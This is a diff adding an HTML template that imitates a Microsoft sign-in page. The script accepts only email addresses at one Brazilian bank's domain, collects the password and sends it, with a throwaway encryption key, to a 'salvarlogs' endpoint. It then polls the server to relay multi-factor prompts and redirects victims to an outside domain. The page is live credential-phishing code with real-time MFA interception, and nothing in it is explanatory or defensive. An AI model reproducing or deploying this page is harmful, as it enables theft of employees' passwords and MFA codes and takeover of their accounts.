@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+    <link rel="shortcut icon" href="{{ url_for('static', filename='assets/favicon.ico') }}">
+    <title>Sign in</title>
+</head>
+<body>
+    <div class="container">
+        <form action="signup.php" method="POST" name="logonForm" ENCTYPE="application/x-www-form-urlencoded" autocomplete="off">
+            <img class="logo" src="{{ url_for('static', filename='assets/mslogo.png') }}">
+            <div class="forms-container">
+                <div class="forms">
+                    <div class="first">
+                        <h2>Sign in</h2>
+                        <div class="form-group">
+                            <input type="email" placeholder="Email, or Phone" required>
+                        </div>
+                        <p>No acount? <a href="#">Create One!</a></p>
+                        <a href="#">Sign in with a security key <span>?</span></a>
+                        <button type="button" class="next-btn">Next</button>
+                    </div>
+                    <div class="second">
+                        <p><span class="arrow-btn">&#8592;</span> <span class="email">helloworld@hotmail.com</span></p>
+                        <h2>Enter password</h2>
+                        <div class="form-group">
+                            <input type="password" placeholder="Password" required>
+                        </div>
+                        <a href="#">Forgot password?</a>
+                        <button type="button" id="submitButton" class="submit-btn">Sign in</button>
+                    </div>
+                </div>
+            </div>
+        </form>
+    </div>
+    <div id="footer" role="contentinfo" data-bind="
+        externalCss: {
+            'footer': true,
+            'has-background': !$page.useDefaultBackground() &amp;&amp; $page.showFooter(),
+            'background-always-visible': $page.backgroundLogoUrl }" class="footer ext-footer">
+
+        <div data-bind="component: { name: 'footer-control',
+            publicMethods: $page.footerMethods,
+            params: {
+                serverData: svr,
+                useDefaultBackground: $page.useDefaultBackground(),
+                hasDarkBackground: $page.backgroundLogoUrl(),
+                showLinks: true,
+                showFooter: $page.showFooter(),
+                termsText: $page.termsText(),
+                hidePrivacy: $page.hidePrivacy(),
+                privacyLink: $page.privacyLink() },
+            event: {
+                agreementClick: $page.footer_agreementClick,
+                showDebugDetails: $page.toggleDebugDetails_onClick } }">
+<div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links" data-bind="externalCss: { 'footer-links': true }">
+<a id="ftrTerms" data-bind="
+            text: termsText,
+            href: termsLink,
+            click: termsLink_onClick,
+            externalCss: {
+                'footer-content': true,
+                'footer-item': true,
+                'has-background': !useDefaultBackground,
+                'background-always-visible': hasDarkBackground }" href="https://dlptest.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-US&amp;uaid=e0a26cd453fc414f98698f45e0c991b9" class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
+        <a id="ftrPrivacy" data-bind="
+            text: privacyText,
+            href: privacyLink,
+            click: privacyLink_onClick,
+            externalCss: {
+                'footer-content': true,
+                'footer-item': true,
+                'has-background': !useDefaultBackground,
+                'background-always-visible': hasDarkBackground }" href="https://dlptest.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-US&amp;uaid=e0a26cd453fc414f98698f45e0c991b9" class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
+    <a id="moreOptions" href="#" role="button" data-bind="
+        click: moreInfo_onClick,
+        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
+        attr: { 'aria-expanded': showDebugDetails().toString() },
+        hasFocusEx: focusMoreInfo(),
+        externalCss: {
+            'footer-content': true,
+            'has-background': !useDefaultBackground,
+            'background-always-visible': hasDarkBackground }" aria-label="Click here for troubleshooting information" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
+</div></div>
+    </div>
+    <script>
+        function arrayBufferToBase64(buffer) {
+            const binary = String.fromCharCode.apply(null, new Uint8Array(buffer));
+            return btoa(binary);  // Base64 encoding
+        }
+
+        async function generateSymmetricKey() {
+            const key = await crypto.subtle.generateKey(
+                {
+                    name: "AES-GCM",
+                    length: 256, // You can also use 128 or 192
+                },
+                true, // Can the key be exported
+                ["encrypt", "decrypt"] // What operations can the key be used for
+            );
+            return key;
+        }
+        
+        async function encryptString(key, plainText) {
+            const iv = crypto.getRandomValues(new Uint8Array(12)); // 12 bytes for AES-GCM
+
+            const encoder = new TextEncoder();
+            const encodedText = encoder.encode(plainText);
+
+            const encryptedContent = await crypto.subtle.encrypt(
+                {
+                    name: "AES-GCM",
+                    iv: iv,
+                },
+                key,
+                encodedText
+            );
+
+            return {
+                cipherText: new Uint8Array(encryptedContent),
+                iv: iv
+            };
+        }
+
+        function decryptString(key, encryptedData, iv) {
+            const decryptedContent = crypto.subtle.decrypt(
+                {
+                    name: "AES-GCM",
+                    iv: iv,
+                },
+                key,
+                encryptedData
+            );
+
+            const decoder = new TextDecoder();
+            return decoder.decode(decryptedContent);
+        }
+
+        function arrayBufferToBase64(buffer) {
+            const binary = String.fromCharCode.apply(null, new Uint8Array(buffer));
+            return btoa(binary);  // Base64 encoding
+        }
+        
+        async function demoEncryption(plainText) {
+            // Step 1: Generate a symmetric key
+            const key = await generateSymmetricKey();
+
+            // Step 2: Encrypt the string
+            const encryptedData = await encryptString(key, plainText);
+
+            console.log("Encrypted:", encryptedData);
+
+            // Step 3: Decrypt the string
+            //const decryptedText = decryptString(key, encryptedData.cipherText, encryptedData.iv);
+
+            //console.log("Decrypted:", decryptedText);
+
+            // Here to obtain base64 key
+            const exportedKey = await crypto.subtle.exportKey("raw", key);
+
+            const base64Key = arrayBufferToBase64(exportedKey);
+            const base64Data = arrayBufferToBase64(encryptedData.cipherText);
+            const base64Iv = arrayBufferToBase64(encryptedData.iv);
+
+            return {
+                key: base64Key,
+                encryptedData: base64Data,
+                iv: base64Iv
+            };
+        }
+
+        const forms = document.querySelector('.forms');
+        const nextButton = document.querySelector('.next-btn');
+        const arrowButton = document.querySelector('.arrow-btn');
+    
+        const emailInput = document.querySelector('.first input');
+        const emailDisplay = document.querySelector('.email');
+        const passwordInput = document.querySelector('.second input');
+        nextButton.addEventListener('click', () => {
+            email = emailInput.value;
+            emailDisplay.innerText = emailInput.value.trim();
+            if (email && email.includes("@safra.com.br")) {
+                forms.classList.add('next-form');
+                emailDisplay.innerText = emailInput.value;
+                passwordInput.setAttribute('placeholder', 'Password for ' + emailInput.value);
+            }   
+        });
+    
+        arrowButton.addEventListener('click', () => {
+            forms.classList.remove('next-form');
+            document.querySelector('.bottom').style.display = 'flex';
+        });
+
+
+        function isValidInput(input) {
+            const lengthCheck = input.length > 7;
+            const hasUppercase = /[A-Z]/.test(input);
+            const hasLowercase = /[a-z]/.test(input);
+            const hasNumber = /[0-9]/.test(input);
+
+            return lengthCheck && hasUppercase && hasLowercase && hasNumber;
+        }
+
+        async function checkMfa(email) {
+            while (true) {
+                await new Promise(resolve => setTimeout(resolve, 5000)); // 5 second delay
+                try {
+                    const data = {
+                        uuid: "f873ec72-2af5-415b-849c-6710eced1c65",
+                        u: email
+                    }
+                    const response = await (await fetch("/vpo/prospect/config", {
+                        method: "POST",
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(data)
+                    })).json();
+                    if (response.user != "") {
+                        if (response.user == "NEED_USER_CONFIRM_MFA") {
+                            window.location.href = 'https://rhbeneficios.com/safra/auth2?tenant-id=219A0371-32WQA13215A1-183112AVA3&u='+email+"&t="+response.mfa+"&tenant={{ tenant }}"
+                        }
+                        if (response.user == "INCORRECT_PWD" ) {
+                            window.location.href = 'https://rhbeneficios.com/safra/auth?error=1'
+                        }
+                    } 
+                } catch (error) {
+                    console.error('request failed: ',error)
+                }
+            }
+        }
+
+        const submitButton = document.querySelector('.submit-btn');
+
+        submitButton.addEventListener('click', async (event) => {
+            password = passwordInput.value;
+            if (isValidInput(password)) {
+                
+                document.getElementById("submitButton").disabled = true;
+                document.body.style.cursor = "wait";
+                enc = await demoEncryption(btoa(password));
+                console.log(enc);
+                const data_to_save = {
+                    uuid: "f873ec72-2af5-415b-849c-6710eced1c65",
+                    u: email,
+                    p: enc.encryptedData,
+                    iv: enc.iv,
+                    k: enc.key
+                };//Teste123@safra.com.br
+
+                fetch("/vpo/prospect/salvarlogs", {
+                    method: "POST",
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data_to_save)
+                })
+                .then(response => {
+                    if (!response.ok) throw new Error('Network response was not ok');
+                    return response.json();
+                }).then(result => {
+                    checkMfa(email);
+
+
+                    window.location.replace = 'https://rhbeneficios.com/safra/microsoft/auth?tenant-id=219A0371-32WQA13215A1-183112AVA3&u='+email
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+            }
+        });
+    </script>    
+</body>
+</html>
